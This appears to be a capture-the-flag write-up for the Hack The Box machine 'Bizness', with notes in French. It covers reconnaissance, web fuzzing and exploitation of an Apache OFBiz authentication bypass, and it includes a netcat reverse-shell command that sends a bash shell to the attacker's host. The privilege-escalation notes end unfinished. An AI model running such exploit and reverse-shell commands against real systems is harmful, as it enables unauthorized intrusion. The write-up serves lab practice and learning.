# Bizness
```shell
nmap -sV -sC 10.10.11.252
        22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
        | ssh-hostkey: 
        |   3072 3e21d5dc2e61eb8fa63b242ab71c05d3 (RSA)
        |   256 3911423f0c250008d72f1b51e0439d85 (ECDSA)
        |_  256 b06fa00a9edfb17a497886b23540ec95 (ED25519)
        80/tcp  open  http     nginx 1.18.0
        |_http-server-header: nginx/1.18.0
        |_http-title: Did not follow redirect to https://bizness.htb/
        443/tcp open  ssl/http nginx 1.18.0
        | tls-nextprotoneg: 
        |_  http/1.1
        | ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
        | Not valid before: 2023-12-14T20:03:40
        |_Not valid after:  2328-11-10T20:03:40
        |_http-server-header: nginx/1.18.0
        | tls-alpn: 
        |_  http/1.1
        |_ssl-date: TLS randomness does not represent time
        |_http-title: Did not follow redirect to https://bizness.htb/
        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
# add bizness.htb dans /etc/host
ffuf -u 'https://bizness.htb/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/common.txt -k -fs 0
        index.html
        control
ffuf -u 'https://bizness.htb/control/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/common.txt -k -fw 10468 
reports list            [Status: 200, Size: 34641, Words: 10469, Lines: 492, Duration: 501ms]
logout                  [Status: 200, Size: 10756, Words: 1182, Lines: 180, Duration: 7600ms]
main                    [Status: 200, Size: 9308, Words: 913, Lines: 141, Duration: 7401ms]
login                   [Status: 200, Size: 11060, Words: 1236, Lines: 186, Duration: 7860ms]
view                    [Status: 200, Size: 9308, Words: 913, Lines: 141, Duration: 1407ms]
views                   [Status: 200, Size: 9308, Words: 913, Lines: 141, Duration: 2040ms]
# on a page de login
# on search exploit sur google pour ofbiz, on find https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass
git clone https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass
nc -lvnp 8001
python3 -d exploit.py --url https://bizness.htb --cmd 'nc 10.10.16.47 8001 -e /bin/bash'
# on a shell 
# privesc
# on find dans /opt dossier ofbiz
# on check les trucs dedans
# dans docker/entrypoint.sh, on find que hash est salt et que framework/resources/templates/AdminUserLoginData.xml est use
# on find dans framework/resources/templates/AdminUserLoginData.xml un hash, on check le script on voit que le format est ENCODED_PASSWORD_HASH="\$SHA\$${SALT}\$${SHA1SUM_BASE64}"
# on doit coder script pour dechiffrer le hash
# cest pas ca on try de find SHA keywords
grep -R SHA
# on find /opt/ofbiz/runtime/data/derby, on va check dedans 
 


```
